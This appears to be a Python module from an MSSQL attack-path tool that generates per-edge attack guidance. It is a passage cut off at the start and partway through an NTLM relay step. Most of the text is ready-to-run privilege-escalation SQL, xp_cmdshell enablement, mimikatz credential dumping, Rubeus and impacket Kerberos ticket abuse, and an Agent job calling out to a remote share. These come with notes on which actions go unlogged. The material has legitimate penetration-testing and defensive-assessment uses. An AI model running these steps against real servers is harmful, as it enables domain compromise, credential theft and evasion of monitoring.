    )


def _gen_grant_any_permission(ctx: EdgeCtx):
    win = (
        f"Connect to the {ctx.sql_server_name} SQL server as a member of securityadmin "
        f"{_WIN_TOOLS} and execute the following SQL statements:\n"
        "-- Grant CONTROL SERVER to yourself or another login \n"
        "GRANT CONTROL SERVER TO [target_login]; \n"
        "-- Or grant specific high privileges \n"
        "GRANT IMPERSONATE ANY LOGIN TO [target_login]; \n"
        "GRANT ALTER ANY LOGIN TO [target_login]; \n"
        "GRANT ALTER ANY SERVER ROLE TO [target_login]; "
    )
    lin = (
        f"Connect to the {ctx.sql_server_name} SQL server as a member of securityadmin "
        f"{_LINUX_TOOLS} and execute the following SQL statements:\n"
        "-- Grant CONTROL SERVER to yourself or another login \n"
        "GRANT CONTROL SERVER TO [target_login]; \n"
        "-- Or grant specific high privileges \n"
        "GRANT IMPERSONATE ANY LOGIN TO [target_login]; \n"
        "GRANT ALTER ANY LOGIN TO [target_login]; \n"
        "GRANT ALTER ANY SERVER ROLE TO [target_login]; "
    )
    opsec = (
        "SQL Server logs certain security-related events to a trace log by default, "
        "but must be configured to forward them to a SIEM. The local log may roll "
        "over frequently on large, active servers, as the default storage size is "
        "only 20 MB. \n"
        "Permission grants are not logged by default in the trace log."
    )
    refs = (
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17#fixed-server-level-roles \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql?view=sql-server-ver17 \n"
        "- https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/"
    )
    return (
        "The securityadmin fixed server role can grant any server-level permission "
        "to any login, including CONTROL SERVER. This effectively allows members to "
        "grant themselves or others full control of the SQL Server instance.",
        win,
        lin,
        opsec,
        refs,
    )


def _gen_grant_any_db_permission(ctx: EdgeCtx):
    win = (
        f"Connect to the {ctx.sql_server_name} SQL server as a member of db_securityadmin "
        f"{_WIN_TOOLS} and execute the following SQL statements:\n"
        f"USE {ctx.target_name}; \n"
        "   -- Create a role \n"
        "   CREATE ROLE [EvilRole]; \n"
        "   -- Add self \n"
        "   EXEC sp_addrolemember 'EvilRole', 'db_secadmin'; \n"
        "   -- Grant the role CONTROL of the database \n"
        "   GRANT CONTROL TO [EvilRole]; \n"
        "   -- With CONTROL, we can impersonate dbo \n"
        "   EXECUTE AS USER = 'dbo'; \n"
        "   \tSELECT USER_NAME(); \n"
        "   \t-- Now we can add ourselves to db_owner \n"
        "   \tEXEC sp_addrolemember 'db_owner', 'db_secadmin'; \n"
        "\t    -- Or perform any other action in the database \n"
        "   REVERT "
    )
    lin = (
        f"Connect to the {ctx.sql_server_name} SQL server as a member of db_securityadmin "
        f"{_LINUX_TOOLS} and execute the following SQL statements:\n"
        f"USE {ctx.target_name}; \n"
        "   -- Create a role \n"
        "   CREATE ROLE [EvilRole]; \n"
        "   -- Add self \n"
        "   EXEC sp_addrolemember 'EvilRole', 'db_secadmin'; \n"
        "   -- Grant the role CONTROL of the database \n"
        "   GRANT CONTROL TO [EvilRole]; \n"
        "   -- With CONTROL, we can impersonate dbo \n"
        "   EXECUTE AS USER = 'dbo'; \n"
        "   \tSELECT USER_NAME(); \n"
        "   \t-- Now we can add ourselves to db_owner \n"
        "   \tEXEC sp_addrolemember 'db_owner', 'db_secadmin'; \n"
        "\t    -- Or perform any other action in the database \n"
        "   REVERT "
    )
    opsec = (
        "SQL Server logs certain security-related events to a trace log by default, "
        "but must be configured to forward them to a SIEM. The local log may roll "
        "over frequently on large, active servers, as the default storage size is "
        "only 20 MB. \n"
        "Database role membership changes are logged by default. \n"
        "To view database role membership change logs, execute: \n"
        + _DB_ROLE_TRACE_QUERY
    )
    refs = (
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17#fixed-database-roles \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-role-transact-sql?view=sql-server-ver17"
    )
    return (
        "The db_securityadmin fixed database role db_securityadmin can create "
        "roles, manage role memberships, and grant all database permissions, "
        "effectively granting full database control.",
        win,
        lin,
        opsec,
        refs,
    )


_CONNECT_REFS = (
    "- https://learn.microsoft.com/en-us/sql/relational-databases/policy-based-management/server-public-permissions?view=sql-server-ver16 \n"
    f"{_REF_DEFAULT_TRACE} \n"
    "- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
)
_CONNECT_OPSEC = (
    _TRACE_PREAMBLE
    + "Log events are generated by default for failed login attempts and can be "
    "viewed by executing EXEC sp_readerrorlog 0, 1, 'Login';), but successful "
    "login events are not logged by default. "
)


def _gen_connect(ctx: EdgeCtx):
    general = win = lin = ""
    if ctx.target_type_description == "SERVER":
        general = (
            "The CONNECT SQL permission allows the source "
            f"{ctx.source_type} to connect to the {ctx.sql_server_name} SQL Server "
            "if the login is not disabled or currently locked out. This permission "
            "is granted to every login created on the server by default."
        )
        win = (
            f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and "
            "authenticate with valid credentials for a server login"
        )
        lin = (
            f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and "
            "authenticate with valid credentials for a server login"
        )
    elif ctx.target_type_description == "DATABASE":
        general = (
            f"The CONNECT permission allows the source {ctx.source_type} to connect "
            f"to the {ctx.target_name} database. This permission is granted to every "
            "database user created in the database by default."
        )
        win = (
            f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and "
            "authenticate with valid credentials for a server login, then connect "
            f"to the {ctx.target_name} database by executing USE {ctx.target_name}; GO; "
        )
        lin = (
            f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and "
            "authenticate with valid credentials for a server login, then connect "
            f"to the {ctx.target_name} database by executing USE {ctx.target_name}; GO; "
        )
    return general, win, lin, _CONNECT_OPSEC, _CONNECT_REFS


def _gen_connect_any_database(ctx: EdgeCtx):
    general = win = lin = ""
    if ctx.target_type_description == "SERVER":
        general = (
            f"The CONNECT ANY DATABASE permission allows the source {ctx.source_type} "
            f"to connect to any database under the {ctx.sql_server_name} SQL Server "
            "without a mapped database user."
        )
        win = (
            f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and "
            "authenticate with valid credentials for a server login, then connect "
            "to any database by executing USE <database_name>; GO; "
        )
        lin = (
            f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and "
            "authenticate with valid credentials for a server login, then connect "
            "to any database by executing USE <database_name>; GO; "
        )
    elif ctx.target_type_description == "DATABASE":
        general = (
            f"The CONNECT ANY DATABASE permission allows the source {ctx.source_type} "
            f"to connect to the {ctx.target_name} database without a mapped database "
            "user."
        )
        win = (
            f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and "
            "authenticate with valid credentials for a server login, then connect "
            f"to the {ctx.target_name} database by executing USE {ctx.target_name}; GO; "
        )
        lin = (
            f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and "
            "authenticate with valid credentials for a server login, then connect "
            f"to the {ctx.target_name} database by executing USE {ctx.target_name}; GO; "
        )
    return general, win, lin, _CONNECT_OPSEC, _CONNECT_REFS


def _gen_alter_any_app_role(ctx: EdgeCtx):
    return (
        "WARNING: DO NOT execute this attack, as it will immediately break the "
        "application that relies on this application role to access this database "
        f"and WILL cause an outage. The ALTER ANY APPLICATION ROLE permission on a "
        f"database allows the source {ctx.source_type} to change the password for an "
        "application role, activate the application role with the new password, and "
        "execute actions with the application role's permissions.",
        "WARNING: DO NOT execute this attack, as it will immediately break the "
        "application that relies on this application role to access this database "
        "and WILL cause an outage.",
        "WARNING: DO NOT execute this attack, as it will immediately break the "
        "application that relies on this application role to access this database "
        "and WILL cause an outage.",
        "This attack should not be performed as it will cause an immediate outage "
        "for the application using this role.",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17",
    )


def _gen_alter_any_db_role(ctx: EdgeCtx):
    opsec = (
        _TRACE_PREAMBLE
        + "Log events are generated by default for additions to database role "
        "membership. \n"
        "To view database role membership change logs, execute: \n"
        + _DB_ROLE_TRACE_QUERY
    )
    refs = (
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n"
        f"{_REF_DEFAULT_TRACE} \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
    )
    return (
        "The ALTER ANY ROLE permission on a database allows the source "
        f"{ctx.source_type} to add members to any user-defined database role. Note "
        "that only members of the db_owner fixed database role can add members to "
        "fixed database roles.",
        f"Connect to the {ctx.sql_server_name} SQL server {_WIN_TOOLS} and execute "
        "the following SQL statement:\n"
        f"USE {ctx.database_name};\n"
        "EXEC sp_addrolemember 'role_name', 'user_name';",
        f"Connect to the {ctx.sql_server_name} SQL server {_LINUX_TOOLS} and execute "
        "the following SQL statement:\n"
        f"USE {ctx.database_name};\n"
        "EXEC sp_addrolemember 'role_name', 'user_name';",
        opsec,
        refs,
    )


def _gen_take_ownership(ctx: EdgeCtx):
    sql_suffix = ""
    if ctx.target_type_description == "SERVER_ROLE":
        sql_suffix = f"ALTER AUTHORIZATION ON SERVER ROLE::[{ctx.target_name}] TO [login]; "
    elif ctx.target_type_description == "DATABASE_ROLE":
        sql_suffix = f"ALTER AUTHORIZATION ON ROLE::[{ctx.target_name}] TO [user]; "
    return (
        f"The source {ctx.source_type} can change the owner of this "
        f"{ctx.target_type} or descendent objects in its scope.",
        f"{_win_lead(ctx)}{sql_suffix}",
        f"{_linux_lead(ctx)}{sql_suffix}",
        _TRACE_PREAMBLE + "Role ownership changes are not logged by default.",
        _CHANGE_OWNER_REFS,
    )


def _gen_execute_as(ctx: EdgeCtx):
    if ctx.database_name != "":
        win = (
            f"{_win_lead(ctx)}"
            f"USE {ctx.database_name}; \n"
            f"EXECUTE AS USER = '{ctx.target_name}' \n"
            "   SELECT USER_NAME() \n"
            "REVERT "
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"USE {ctx.database_name}; \n"
            f"EXECUTE AS USER = '{ctx.target_name}' \n"
            "   SELECT USER_NAME() \n"
            "REVERT "
        )
        opsec = _TRACE_PREAMBLE + "Log events are not generated for user impersonation by default."
    else:
        win = (
            f"{_win_lead(ctx)}"
            f"EXECUTE AS LOGIN = '{ctx.target_name}' \n"
            "   SELECT SUSER_NAME() \n"
            "REVERT "
        )
        lin = (
            f"{_linux_lead(ctx)}"
            f"EXECUTE AS LOGIN = '{ctx.target_name}' \n"
            "   SELECT SUSER_NAME() \n"
            "REVERT "
        )
        opsec = _TRACE_PREAMBLE + "Log events are not generated for login impersonation by default."
    refs = (
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n"
        f"{_REF_DEFAULT_TRACE}"
    )
    return (
        "The IMPERSONATE or CONTROL permission on a server login or database user "
        f"allows the source {ctx.source_type} to impersonate the target principal.",
        win,
        lin,
        opsec,
        refs,
    )


def _gen_execute_as_owner(ctx: EdgeCtx):
    win = (
        f"Connect to the {ctx.sql_server_name} SQL server as {ctx.source_name} "
        f"{_WIN_TOOLS} and execute the following SQL statements:\n"
        f"USE {ctx.database_name}; \n"
        "GO \n"
        "CREATE PROCEDURE dbo.EscalatePrivs \n"
        "WITH EXECUTE AS OWNER \n"
        "AS \n"
        "BEGIN \n"
        "    -- Add current login to sysadmin role \n"
        f"    EXEC sp_addsrvrolemember @loginame = '{ctx.source_type}', @rolename = 'sysadmin'; \n"
        "    -- Impersonate the sa login \n"
        "    EXECUTE AS LOGIN = 'sa'; \n"
        "       -- Now executing with sa privileges \n"
        "       SELECT SUSER_NAME(): \n"
        "       -- Perform privileged actions here \n"
        "    REVERT; \n"
        "END; \n"
        "GO \n"
        "EXEC dbo.EscalatePrivs; "
    )
    lin = (
        f"Connect to the {ctx.sql_server_name} SQL server as {ctx.source_name} "
        f"{_LINUX_TOOLS} and execute the following SQL statements:\n"
        f"USE {ctx.database_name}; \n"
        "GO \n"
        "CREATE PROCEDURE dbo.EscalatePrivs \n"
        "WITH EXECUTE AS OWNER \n"
        "AS \n"
        "BEGIN \n"
        "    -- Add current login to sysadmin role \n"
        f"    EXEC sp_addsrvrolemember @loginame = '{ctx.source_type}', @rolename = 'sysadmin'; \n"
        "    -- Impersonate the sa login \n"
        "    EXECUTE AS LOGIN = 'sa'; \n"
        "       -- Now executing with sa privileges \n"
        "       SELECT SUSER_NAME(): \n"
        "       -- Perform privileged actions here \n"
        "    REVERT; \n"
        "END; \n"
        "GO \n"
        "EXEC dbo.EscalatePrivs; "
    )
    opsec = (
        "SQL Server logs certain security-related events to a trace log by default, "
        "but must be configured to forward them to a SIEM. The local log may roll "
        "over frequently on large, active servers, as the default storage size is "
        "only 20 MB. \n"
        "Creating stored procedures is not logged by default. However, adding "
        "members to the sysadmin role is logged. \n"
        "To view server role membership change logs, execute: \n"
        + _SRV_ROLE_TRACE_QUERY
    )
    refs = (
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-clause-transact-sql?view=sql-server-ver17 \n"
        "- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet"
    )
    return (
        f"The source {ctx.source_type} can escalate privileges to the server level "
        "by creating or modifying database objects (stored procedures, functions, "
        "or CLR assemblies) that use EXECUTE AS OWNER. Since the database is "
        "TRUSTWORTHY and owned by a highly privileged login, code executing as the "
        "owner will have those elevated server privileges.",
        win,
        lin,
        opsec,
        refs,
    )


def _gen_is_trusted_by(ctx: EdgeCtx):
    return (
        f"The database {ctx.source_name} has the TRUSTWORTHY property set to ON. "
        "This means that SQL Server trusts this database, allowing code within it "
        "to execute with the privileges of the database owner at the server level.",
        "This relationship may allow privilege escalation when combined with the "
        "ability to execute code within the database if the owner has high "
        "privileges at the server level. See MSSQL_ExecuteAsOwner edges from this "
        "database for exploitation paths.",
        "This relationship enables privilege escalation when combined with the "
        "ability to execute code within the database if the owner has high "
        "privileges at the server level. See MSSQL_ExecuteAsOwner edges from this "
        "database for exploitation paths.",
        "The TRUSTWORTHY property and database ownership are not typically "
        "monitored. Exploitation through CLR assemblies, stored procedures, or "
        "functions that use EXECUTE AS OWNER will not generate specific security "
        "events by default.",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver17 \n"
        "- https://docs.microsoft.com/en-us/sql/t-sql/statements/alter-database-transact-sql-set-options?view=sql-server-ver17",
    )


# ===========================================================================
# Stage-7b generators (AD / linked-server / credential / service-account /
# coercion edges). Verbatim ports of the matching edges.go generators. Strings
# are reproduced exactly (spacing, trailing spaces, "\n" joins) so the entity
# panels render identically. Several reference no ctx fields (fully static).
# ===========================================================================
def _gen_linked_to(ctx: EdgeCtx):
    # edges.go:582-589 — fully static.
    return (
        "The source SQL Server has a linked server connection to the target SQL "
        "Server. The actual privileges available through this link depend on the "
        "authentication configuration and remote user mapping.",
        "Query the linked server: SELECT * FROM [LinkedServerName].[Database]."
        "[Schema].[Table]; or execute commands: EXEC ('sp_configure ''show advanced "
        "options'', 1; RECONFIGURE;') AT [LinkedServerName]; ",
        "Query the linked server: SELECT * FROM [LinkedServerName].[Database]."
        "[Schema].[Table]; or execute commands: EXEC ('sp_configure ''show advanced "
        "options'', 1; RECONFIGURE;') AT [LinkedServerName]; ",
        "Linked server queries are logged in the remote server's trace log as coming "
        "from the linked server login. Errors may reveal information about the remote "
        "server configuration.",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17",
    )


def _gen_linked_as_admin(ctx: EdgeCtx):
    # edges.go:1010-1026 — fully static.
    abuse = (
        "Execute commands with admin privileges on the linked server:\n"
        "-- Enable xp_cmdshell on remote server \n"
        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName]; \n"
        "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName]; \n"
        "EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LinkedServerName]; "
    )
    return (
        "The source SQL Server has a linked server connection to the target with "
        "administrative privileges (sysadmin, securityadmin, CONTROL SERVER, or "
        "IMPERSONATE ANY LOGIN). This allows full control of the remote SQL Server "
        "including privilege escalation.",
        abuse,
        abuse,
        "Linked server admin actions are logged on the remote server as coming from "
        "the linked server connection. Creating logins and adding to sysadmin "
        "generates event logs. Linked server queries may be logged differently than "
        "direct connections.",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17 \n"
        "- https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
    )


def _gen_has_login(ctx: EdgeCtx):
    # edges.go:945-953.
    return (
        "The domain account has a SQL Server login that is enabled and can connect "
        "to the SQL Server. This allows authentication to SQL Server using the "
        "account's credentials.",
        f"Connect to the {ctx.sql_server_name} SQL server and authenticate as "
        f"{ctx.target_name} {_WIN_TOOLS}",
        f"Connect to the {ctx.sql_server_name} SQL server and authenticate as "
        f"{ctx.target_name} {_LINUX_TOOLS}",
        "Windows authentication attempts are logged in SQL Server error logs for "
        "failed logins. Successful logins are not logged by default but can be "
        "enabled. Computer account authentication appears as DOMAIN\\COMPUTER$.",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-properties-security-page?view=sql-server-ver17",
    )


def _gen_host_for(ctx: EdgeCtx):
    # edges.go:662-673.
    return (
        f"The computer {ctx.source_name} hosts the target SQL Server instance "
        f"{ctx.target_name}.",
        "With admin access to the host, you can access the SQL instance: \n"
        "If the SQL instance is running as a built-in account (Local System, Local "
        "Service, or Network Service), it can be accessed with a SYSTEM context with "
        "sqlcmd. \n"
        "If the SQL instance is running in a domain service account context, the "
        "cleartext credentials can be dumped from LSA secrets with mimikatz "
        "sekurlsa::logonpasswords, then they can be used to request a service ticket "
        "for a domain account with admin access to the SQL instance. \n"
        "If there are no domain DBAs, it is still possible to start the instance in "
        "single-user mode, which allows any member of the computer's local "
        "Administrators group to connect as a sysadmin. WARNING: This is disruptive, "
        "possibly destructive, and will cause the database to become unavailable to "
        "other users while in single-user mode. It is not recommended.",
        "If you have root access to the host, you can access SQL Server by "
        "manipulating the service or accessing database files directly.",
        "Host access allows reading memory, modifying binaries, and accessing "
        "database files directly.",
        "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/start-sql-server-in-single-user-mode?view=sql-server-ver17",
    )


def _gen_execute_on_host(ctx: EdgeCtx):
    # edges.go:676-683.
    abuse = (
        "Enable and use xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; "
        "EXEC xp_cmdshell 'whoami'; "
    )
    return (
        "Control of a SQL Server instance allows xp_cmdshell or other OS command "
        "execution capabilities to be used to access the host computer in the "
        "context of the account running the SQL server.",
        abuse,
        abuse,
        "xp_cmdshell configuration option changes are logged in SQL Server error "
        "logs. View the log by executing: EXEC sp_readerrorlog 0, 1, 'xp_cmdshell'; ",
        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17",
    )


def _gen_service_account_for(ctx: EdgeCtx):
    # edges.go:935-942 (the second, winning ServiceAccountFor generator — fully static).
    return (
        "This domain account runs the SQL Server service.",
        "The service account context determines SQL Server's access to network "
        "resources and local system privileges.",
        "The service account context determines SQL Server's access to system "
        "resources and file permissions.",
        "Service account changes require service restart and are logged in Windows "
        "event logs.",
        "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17",
    )


# The Rubeus/getTGS Windows + Linux abuse blocks differ only in the "domain
# account" vs "domain DBA" phrase, so share the builders.
def _kerberos_win_abuse(ctx: EdgeCtx, impersonate: str) -> str:
    return (
        "From a domain-joined machine as the service account (or with valid "
        "credentials):\n"
        "# List SPNs for the SQL Server to find target accounts: \n"
        f"setspn -L {ctx.sql_server_name} \n"
        "# Request TGT for the service account: \n"
        ".\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap \n"
        f"# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the {impersonate}: \n"
        "Rubeus.exe s4u /impersonateuser:<" + ("dba" if impersonate == "domain DBA" else "account") + "> /altservice:<spn> /self /nowrap /ticket:<base64> \n"
        "# Start a sacrificial logon session for the Kerberos ticket: \n"
        "runas /netonly /user:asdf powershell \n"
        "# Import the ticket into the sacrificial logon session: \n"
        "Rubeus.exe ptt /ticket:<base64> \n"
        "# Launch SQL Server Management Studio or sqlcmd and connect to the database. "
    )


def _kerberos_linux_abuse(impersonate: str) -> str:
    return (
        "From a Linux machine with valid credentials:\n"
        "# Request TGT for the service account: \n"
        "getTGT.py internal.lab/sqlsvc:P@ssw0rd  \n"
        f"# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the {impersonate}: \n"
        "python3 gets4uticket.py kerberos+ccache://internal.lab\\\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\\$@internal.lab sccm_s4u.ccache -v \n"
        "# Connect to the  database: \n"
        "KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\\$@sql.internal.lab  -k -no-pass -windows-auth "
    )


_KERBEROS_OPSEC = (
    "Kerberos ticket requests are normal behavior and rarely logged. High volume of "
    "TGS requests might be detected by advanced threat hunting. Event ID 4769 "
    "(Kerberos Service Ticket Request) is logged on domain controllers but typically "
    "not monitored for SQL service accounts."
)
_KERBEROS_REFS = (
    "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17 "
)


def _gen_get_tgs(ctx: EdgeCtx):
    # edges.go:956-980.
    return (
        "The SQL Server service account can request Kerberos service tickets for "
        "domain accounts that have a login on this SQL Server.",
        _kerberos_win_abuse(ctx, "domain account"),
        _kerberos_linux_abuse("domain account"),
        _KERBEROS_OPSEC,
        _KERBEROS_REFS,
    )


def _gen_get_admin_tgs(ctx: EdgeCtx):
    # edges.go:983-1007.
    return (
        "The SQL Server service account can request Kerberos service tickets for "
        "domain accounts that have administrative privileges on this SQL Server.",
        _kerberos_win_abuse(ctx, "domain DBA"),
        _kerberos_linux_abuse("domain DBA"),
        _KERBEROS_OPSEC,
        _KERBEROS_REFS,
    )


def _gen_has_db_scoped_cred(ctx: EdgeCtx):
    # edges.go:830-837 — fully static.
    return (
        "The database contains a database-scoped credential that authenticates as "
        "the target domain account when accessing external resources, although there "
        "is no guarantee the credentials are currently valid. Unlike server-level "
        "credentials, these are contained within the database and portable with "
        "database backups.",
        "The credential could be crackable if it has a weak password and is used "
        "automatically when accessing external data sources from this database. "
        "Specific abuse for database-scoped credentials required further research.",
        "The credential is used automatically when accessing external data sources "
        "from this database. Specific abuse for database-scoped credentials required "
        "further research.",
        "Database-scoped credential usage is logged when accessing external "
        "resources. These credentials are included in database backups, making them "
        "portable. The credential secret is encrypted and cannot be retrieved "
        "directly.",
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-database-scoped-credential-transact-sql?view=sql-server-ver17 \n"
        "- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/",
    )


def _gen_has_mapped_cred(ctx: EdgeCtx):
    # edges.go:841-891 — fully static. The Linux abuse block is a long literal.
    linux = (
        " -- SQL Server Agent must be running/started (or access box via xp_cmdshell first, then start, which requires admin)\n"
        "\n"
        "-- Server will validate creds before executing the job\n"
        "CREATE CREDENTIAL MyCredential1\n"
        "WITH IDENTITY = 'MAYYHEM\\lowpriv',\n"
        "SECRET = 'password';\n"
        "\n"
        "EXEC msdb.dbo.sp_add_proxy \n"
        "    @proxy_name = 'ETL_Proxy',\n"
        "    @credential_name = 'MyCredential1',\n"
        "    @enabled = 1;\n"
        "\n"
        "-- 3. Grant proxy access to subsystems (CmdExec for OS commands)\n"
        "EXEC msdb.dbo.sp_grant_proxy_to_subsystem \n"
        "    @proxy_name = 'ETL_Proxy',\n"
        "    @subsystem_name = 'CmdExec';\n"
        "\n"
        "-- 4. CREATE THE JOB FIRST\n"
        "EXEC msdb.dbo.sp_add_job \n"
        "    @job_name = N'MyJob',\n"
        "    @enabled = 1,\n"
        "    @description = N'Test job using proxy';\n"
        "\n"
        "-- 5. Now add the job step that uses the proxy\n"
        "EXEC msdb.dbo.sp_add_jobstep\n"
        "    @job_name = N'MyJob',\n"
        "    @step_name = N'Run Command as Proxy User',\n"
        "    @step_id = 1,\n"
        "    @subsystem = N'CmdExec',\n"
        "    @command = N'cmd /c \"\\\\10.4.10.254\\\\c\"',\n"
        "    @proxy_name = N'ETL_Proxy';\n"
        "\n"
        "-- Re-run\n"
        "EXEC msdb.dbo.sp_start_job @job_name = N'MyJob';\n"
        "\n"
        "-- 6. Add job to local server\n"
        "EXEC msdb.dbo.sp_add_jobserver \n"
        "    @job_name = N'MyJob',\n"
        "    @server_name = N'(local)';\n"
        "\n"
        "-- 7. Execute the job immediately to test\n"
        "EXEC msdb.dbo.sp_start_job @job_name = N'MyJob'; "
    )
    return (
        "This SQL login has a mapped credential that allows it to authenticate as "
        "the target domain account when accessing external resources outside of SQL "
        "Server, including over the network and at the host OS level. However, there "
        "is no guarantee the credentials are currently valid. SQL Server Agent must "
        "be running (could potentially be started via xp_cmdshell if service account "
        "has permission) and the login must have permission to add a credential "
        "proxy, grant the proxy access to a subsystem such as CmdExec or PowerShell, "
        "and add/start a job using the proxy to traverse this edge.",
        "The credential could be crackable if it has a weak password and is used "
        "automatically when the login accesses certain external resources",
        linux,
        "Credential usage is logged when accessing external resources. The actual "
        "credential password is encrypted and cannot be retrieved. Credential "
        "mapping changes are not logged in the default trace.",
        "- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-credential-transact-sql?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/credentials-database-engine?view=sql-server-ver17 \n"
        "- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/",
    )


def _gen_has_proxy_cred(ctx: EdgeCtx):
    # edges.go:894-932 — interpolates ProxyName / CredentialIdentity / Subsystems / IsEnabled.
    win = (
        "Create and execute a SQL Agent job using the proxy:\n"
        "-- Create job \n"
        f"EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest_{ctx.proxy_name}'; \n"
        "-- Add job step using proxy \n"
        "EXEC msdb.dbo.sp_add_jobstep \n"
        f"   @job_name = 'ProxyTest_{ctx.proxy_name}', \n"
        "   @step_name = 'RunAsProxy', \n"
        "   @subsystem = 'CmdExec', \n"
        "   @command = 'whoami > C:\\temp\\proxy_user.txt', \n"
        f"   @proxy_name = '{ctx.proxy_name}'; \n"
        "-- Execute job \n"
        f"EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest_{ctx.proxy_name}'; \n"
        "-- Check job status \n"
        f"EXEC msdb.dbo.sp_help_jobactivity @job_name = 'ProxyTest_{ctx.proxy_name}'; "
    )
    lin = (
        "Create and execute a SQL Agent job using the proxy:\n"
        "-- Create job \n"
        f"EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest_{ctx.proxy_name}'; \n"
        "-- Add job step using proxy \n"
        "EXEC msdb.dbo.sp_add_jobstep \n"
        f"   @job_name = 'ProxyTest_{ctx.proxy_name}', \n"
        "   @step_name = 'RunAsProxy', \n"
        "   @subsystem = 'CmdExec', \n"
        "   @command = 'whoami > /tmp/proxy_user.txt', \n"
        f"   @proxy_name = '{ctx.proxy_name}'; \n"
        "-- Execute job \n"
        f"EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest_{ctx.proxy_name}'; "
    )
    enabled_phrase = "ENABLED" if ctx.is_enabled else "DISABLED - must be enabled before use"
    return (
        f"The SQL principal is authorized to use SQL Agent proxy '{ctx.proxy_name}' "
        f"that runs job steps as {ctx.credential_identity}. This proxy can be used "
        f"with subsystems: {ctx.subsystems}. There is no guarantee the credentials "
        "are currently valid.",
        win,
        lin,
        "SQL Agent job execution is logged in msdb job history tables and Windows "
        f"Application event log. The job runs as {ctx.credential_identity}. Proxy is "
        f"{enabled_phrase}.",
        "- https://learn.microsoft.com/en-us/sql/ssms/agent/create-a-sql-server-agent-proxy?view=sql-server-ver17 \n"
        "- https://learn.microsoft.com/en-us/sql/ssms/agent/use-proxies-to-run-jobs?view=sql-server-ver17 \n"
        "- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/",
    )


def _gen_coerce_and_relay(ctx: EdgeCtx):
    # edges.go:1029-1058 — interpolates SQLServerName into the ntlmrelayx target.
    win = (
        "Coerce and relay authentication to SQL Server:\n"
        "# 1. Set up NTLM relay targeting SQL Server \n"
        f"ntlmrelayx.py -t mssql://{ctx.sql_server_name} -smb2support \n"
